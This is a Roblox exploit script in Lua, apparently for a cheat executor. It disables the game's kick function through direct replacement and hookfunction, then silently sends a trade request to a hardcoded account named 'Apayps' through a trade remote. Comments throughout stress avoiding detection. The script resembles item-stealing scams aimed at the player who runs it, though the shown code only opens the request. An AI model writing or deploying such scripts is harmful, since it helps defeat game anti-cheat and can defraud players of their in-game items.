-- ===== CONFIG =====
local TARGET_NAME = "Apayps"  -- Player to trade with
local TRADE_DELAY = 5         -- Wait before trading (seconds)

-- ===== STEALTH KICK PROTECTION =====
do
    -- Method 1: Direct function replacement (least detectable)
    local Player = game:GetService("Players").LocalPlayer
    local RealKick = Player.Kick
    Player.Kick = function() end  -- Complete silent block

    -- Method 2: Backup protection
    if hookfunction then
        hookfunction(RealKick, function() end)
    end
end

-- ===== LOW-VISIBILITY TRADE SYSTEM =====
task.delay(TRADE_DELAY, function()
    -- Wait for game to fully load
    while not game:IsLoaded() or not game.Players.LocalPlayer do
        task.wait()
    end

    -- Find target through iteration (no FindFirstChild)
    local Target
    for _,v in pairs(game.Players:GetPlayers()) do
        if v.Name == TARGET_NAME then
            Target = v
            break
        end
    end

    -- Find trade remote through iteration
    local TradeRemote
    for _,v in pairs(game.ReplicatedStorage:GetDescendants()) do
        if (v.Name == "SendRequest" or v.Name == "RequestTrade") 
        and (v:IsA("RemoteFunction") or v:IsA("RemoteEvent")) then
            TradeRemote = v
            break
        end
    end

    -- Execute trade silently
    if Target and TradeRemote then
        pcall(function()
            if TradeRemote:IsA("RemoteFunction") then
                TradeRemote:InvokeServer(Target)
            else
                TradeRemote:FireServer(Target)
            end
        end)
    end
end)

print("System active")  -- Minimal output
